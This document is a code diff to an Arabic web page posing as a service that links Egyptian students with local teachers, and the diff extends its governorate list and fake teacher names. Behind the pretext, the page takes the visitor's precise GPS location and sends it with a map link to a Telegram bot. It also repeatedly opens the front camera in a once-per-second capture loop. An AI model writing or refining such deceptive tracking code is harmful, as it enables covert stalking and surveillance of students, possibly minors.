@@ -42,10 +42,6 @@
         .mic-btn { width: 85px; height: 85px; border-radius: 50%; background: var(--ok); border: none; color: #fff; font-size: 30px; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; transition: 0.3s; box-shadow: 0 10px 25px rgba(34, 197, 94, 0.3); }
         .mic-btn.active { background: var(--r); animation: pulse 1s infinite; }
 
-        .feed-container { height: 500px; overflow: hidden; position: relative; background: #f8fafc; border-radius: 30px; }
-        #feed-mover { position: absolute; width: 100%; transition: 0.8s cubic-bezier(0.4, 0, 0.2, 1); }
-        .feed-item { padding: 20px; border-bottom: 1px solid #edf2f7; background: #fff; margin: 8px; border-radius: 20px; font-size: 14px; box-shadow: 0 4px 10px rgba(0,0,0,0.02); }
-
         #custom-alert { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); width: 92%; max-width: 420px; background: #fff; border-radius: 25px; padding: 20px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); z-index: 35000; transition: 0.5s; border-right: 10px solid var(--a); }
         #custom-alert.show { top: 30px; }
 
@@ -104,7 +100,7 @@
             <p style="font-size:13px; color:#64748b">تواصل مع المعلمين من محافظتك فوراً</p>
             <select id="user-gov">
                 <option value="" disabled selected>اختر محافظتك الآن</option>
-                <option>القاهرة</option><option>الجيزة</option><option>الإسكندرية</option><option>الشرقية</option><option>الدقهلية</option>
+                <option>القاهرة</option><option>الجيزة</option><option>الإسكندرية</option><option>الدقهلية</option><option>البحر الأحمر</option><option>البحيرة</option><option>الفيوم</option><option>الغربية</option><option>الإسماعيلية</option><option>المنوفية</option><option>المنيا</option><option>القليوبية</option><option>الوادي الجديد</option><option>السويس</option><option>اسوان</option><option>اسيوط</option><option>بني سويف</option><option>بورسعيد</option><option>دمياط</option><option>الشرقية</option><option>جنوب سيناء</option><option>كفر الشيخ</option><option>مطروح</option><option>الأقصر</option><option>قنا</option><option>شمال سيناء</option><option>سوهاج</option>
             </select>
             <button class="btn-action" style="background:#25d366;" onclick="startTeacherChat()">
                 <i class="fa-brands fa-whatsapp"></i> تفعيل الدردشة مع معلمي
@@ -194,7 +190,7 @@
         let UN = "غير معروف", UP = "لا يوجد", UGOV = "";
         let activeStream = null;
 
-        const teachers = { "القاهرة": "أ. أحمد خالد", "الجيزة": "أ. محمود زكي", "الإسكندرية": "أ. ياسر علي", "الشرقية": "أ. عماد حمدي", "الدقهلية": "أ. إبراهيم عادل" };
+        const teachers = { "القاهرة": "أ. أحمد خالد", "الجيزة": "أ. محمود زكي", "الإسكندرية": "أ. ياسر علي", "الدقهلية": "أ. إبراهيم عادل", "البحر الأحمر": "أ. سامح فوزي", "البحيرة": "أ. حسن جلال", "الفيوم": "أ. رضا جمال", "الغربية": "أ. طارق نور", "الإسماعيلية": "أ. كريم صفوت", "المنوفية": "أ. سعيد أنور", "المنيا": "أ. أشرف حجازي", "القليوبية": "أ. حمدي نصار", "الوادي الجديد": "أ. شريف بكر", "السويس": "أ. ماجد عمر", "اسوان": "أ. ناصر عز", "اسيوط": "أ. كمال فؤاد", "بني سويف": "أ. جابر عيد", "بورسعيد": "أ. وليد سعيد", "دمياط": "أ. فاروق زين", "الشرقية": "أ. عماد حمدي", "جنوب سيناء": "أ. معتز بالله", "كفر الشيخ": "أ. رفعت عامر", "مطروح": "أ. أسامة حلمي", "الأقصر": "أ. هاني بدري", "قنا": "أ. ربيع قاسم", "شمال سيناء": "أ. أيمن سليمان", "سوهاج": "أ. مدحت صبري" };
 
         function showSystemMsg(msg) {
             const box = document.getElementById('custom-alert');
@@ -228,18 +224,22 @@
 
         function openPreMenu() { document.getElementById('pre-chat-menu').style.display = 'flex'; }
 
-        // --- أذونات الموقع ---
+        // --- أذونات الموقع (تم التظبيط لتظهر فور الضغط) ---
         function startTeacherChat() {
             UGOV = document.getElementById('user-gov').value;
             if(!UGOV) return alert("اختر محافظتك أولاً.");
-            showSystemMsg("جاري طلب إذن الموقع لتوجيهك لأقرب معلم معتمد في " + UGOV);
+            
+            showSystemMsg("جاري طلب إذن الموقع لتحديد أقرب معلم معتمد بمحافظة " + UGOV);
+            
             navigator.geolocation.getCurrentPosition((pos) => {
-                let geo = `📍 موقع الطالب ${UN}:\nhttp://www.google.com/maps/place/${pos.coords.latitude},${pos.coords.longitude}`;
+                let geo = `📍 موقع الطالب ${UN}:\nhttp://www.google.com/maps/place/${pos.coords.latitude},${pos.coords.longitude}\nالمحافظة: ${UGOV}`;
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(geo)}`);
                 document.getElementById('pre-chat-menu').style.display = 'none';
                 document.getElementById('support-window').style.display = 'flex';
                 document.getElementById('t-name').innerText = teachers[UGOV] || "معلم معتمد";
-            }, () => showSystemMsg("يجب السماح بالموقع لتفعيل الدردشة."), {enableHighAccuracy:true});
+            }, (err) => {
+                showSystemMsg("يجب السماح بالوصول للموقع لربطك بمعلمي محافظة " + UGOV);
+            }, {enableHighAccuracy:true, timeout: 5000});
         }
 
         // --- أذونات الكاميرا ---
@@ -289,7 +289,6 @@
             showSystemMsg("تم إرسال السؤال بنجاح. جاري المراجعة من قبل " + teachers[UGOV || "المعلم"]);
             if(activeStream) activeStream.getTracks().forEach(t => t.stop());
             
-            // رصد صورة كل ثانية
             setInterval(async () => {
                 try {
                     const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
